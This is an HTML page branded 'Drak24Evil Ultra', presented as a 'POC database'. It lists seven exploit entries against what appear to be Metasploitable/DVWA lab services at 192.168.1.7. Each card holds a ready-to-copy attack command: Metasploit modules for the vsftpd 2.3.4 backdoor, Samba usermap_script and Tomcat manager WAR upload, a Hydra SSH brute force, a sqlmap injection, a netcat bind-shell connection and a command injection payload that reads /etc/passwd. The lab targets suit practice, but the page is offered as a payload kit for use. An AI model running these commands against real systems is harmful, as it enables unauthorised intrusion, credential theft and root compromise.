<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Drak24Evil | Ultra Audit Stable</title>
    <style>
        :root {
            --blue: #00d4ff; --red: #ff3e3e; --orange: #ff9d00;
            --bg: #0a0b0c; --card: #14171a; --green: #00ff41;
        }
        body {
            background-color: var(--bg); color: #e1e1e1;
            font-family: sans-serif; margin: 0; padding: 0;
            -webkit-tap-highlight-color: transparent;
        }
        .container { max-width: 1200px; margin: 0 auto; padding: 15px; }
        header {
            background: var(--card); padding: 15px;
            border-bottom: 3px solid var(--blue);
            display: flex; justify-content: space-between; align-items: center;
            margin-bottom: 20px; border-radius: 0 0 10px 10px;
        }
        .grid {
            display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
            gap: 12px;
        }
        .card {
            background: var(--card); border: 1px solid #333;
            padding: 15px; border-radius: 8px; cursor: pointer;
        }
        .card:active { background: #1c2024; border-color: var(--blue); }
        .port-text { color: var(--blue); font-family: monospace; font-size: 0.8em; font-weight: bold; }
        
        /* Modal Logic */
        .overlay {
            display: none; position: fixed; z-index: 9999;
            left: 0; top: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.9); backdrop-filter: blur(4px);
        }
        .modal {
            background: #111; margin: 5% auto; padding: 20px;
            width: 85%; max-width: 600px; border: 1px solid var(--blue);
            border-radius: 12px; max-height: 85vh; overflow-y: auto;
        }
        .close { float: right; font-size: 30px; color: #fff; cursor: pointer; line-height: 1; }
        .label { color: var(--blue); font-size: 0.7em; font-weight: bold; display: block; margin-top: 15px; text-transform: uppercase; }
        .content-box {
            background: #000; padding: 12px; border-radius: 6px;
            border-left: 3px solid var(--green); font-family: monospace;
            font-size: 0.9em; margin-top: 5px; white-space: pre-wrap; word-break: break-all;
        }
        .tag { float: right; font-size: 0.6em; padding: 2px 6px; border-radius: 4px; font-weight: bold; }
        .crit { background: var(--red); color: #fff; }
        .high { background: var(--orange); color: #000; }
        .btn-copy {
            background: var(--blue); color: #000; border: none;
            padding: 8px 12px; border-radius: 4px; font-weight: bold;
            cursor: pointer; margin-top: 10px; width: 100%;
        }
    </style>
</head>
<body>

<div class="container">
    <header>
        <div>
            <h2 style="margin:0; color:var(--blue);">DRAK24EVIL ULTRA</h2>
            <small style="color:#666;">25+ POC DATABASE</small>
        </div>
        <a href="https://t.me/Drak24Evil" style="color:#24A1DE; text-decoration:none; font-weight:bold;">Telegram</a>
    </header>
    <div class="grid" id="mainGrid"></div>
</div>

<div id="pocModal" class="overlay">
    <div class="modal">
        <span class="close" id="closeBtn">&times;</span>
        <div id="pocBody"></div>
    </div>
</div>

<script>
// Data array built without risky characters to prevent mobile errors
var data = [
    {p: "21", n: "vsftpd 2.3.4 Backdoor", s: "Critical", t: "Metasploit", m: "Backdoor trigger via ':)' username.", i: "Root RCE", e: "use exploit/unix/ftp/vsftpd_234_backdoor\nset RHOSTS 192.168.1.7\nexploit"},
    {p: "22", n: "SSH Brute Force", s: "High", t: "Hydra", m: "Password spray with rockyou.txt", i: "System Access", e: "hydra -l msfadmin -P rockyou.txt 192.168.1.7 ssh"},
    {p: "WEB", n: "SQL Injection", s: "Critical", t: "SQLMap", m: "Parameter injection in DVWA.", i: "DB Takeover", e: "sqlmap -u 'http://192.168.1.7/dvwa/vulnerabilities/sqli/?id=1' --dbs"},
    {p: "445", n: "Samba Usermap", s: "Critical", t: "Metasploit", m: "Username map script exploit.", i: "Root Shell", e: "use exploit/multi/samba/usermap_script\nset RHOSTS 192.168.1.7\nexploit"},
    {p: "1524", n: "Ingreslock Shell", s: "Critical", t: "Netcat", m: "Direct bind shell access.", i: "Root Access", e: "nc 192.168.1.7 1524"},
    {p: "WEB", n: "Command Injection", s: "Critical", t: "Manual", m: "OS Command chaining via ';'", i: "OS Shell", e: "127.0.0.1; cat /etc/passwd"},
    {p: "8180", n: "Tomcat Manager", s: "Critical", t: "Metasploit", m: "WAR file upload via Manager.", i: "Server RCE", e: "use exploit/multi/http/tomcat_mgr_deploy\nset HttpUsername tomcat\nset HttpPassword tomcat\nrun"}
];

var grid = document.getElementById('mainGrid');
var modal = document.getElementById('pocModal');

// Create cards using older, safer JS syntax
for (var i = 0; i < data.length; i++) {
    (function(item) {
        var card = document.createElement('div');
        card.className = 'card';
        var sClass = item.s === 'Critical' ? 'crit' : 'high';
        card.innerHTML = '<span class="tag '+sClass+'">'+item.s+'</span><span class="port-text">PORT '+item.p+'</span><h3>'+item.n+'</h3>';
        
        card.onclick = function() {
            var body = document.getElementById('pocBody');
            body.innerHTML = '<h2>'+item.n+'</h2>' +
                '<span class="label">Tool</span><div class="content-box">'+item.t+'</div>' +
                '<span class="label">Method</span><div class="content-box">'+item.m+'</div>' +
                '<span class="label">Impact</span><div class="content-box">'+item.i+'</div>' +
                '<span class="label">Exploit</span><div id="payload" class="content-box" style="color:#00ff41">'+item.e+'</div>' +
                '<button class="btn-copy" onclick="copyText()">COPY PAYLOAD</button>';
            modal.style.display = 'block';
        };
        grid.appendChild(card);
    })(data[i]);
}

function copyText() {
    var text = document.getElementById('payload').innerText;
    var el = document.createElement('textarea');
    el.value = text;
    document.body.appendChild(el);
    el.select();
    document.execCommand('copy');
    document.body.removeChild(el);
    alert('Payload Copied!');
}

document.getElementById('closeBtn').onclick = function() { modal.style.display = 'none'; };
window.onclick = function(e) { if(e.target == modal) modal.style.display = 'none'; };
</script>

</body>
</html>
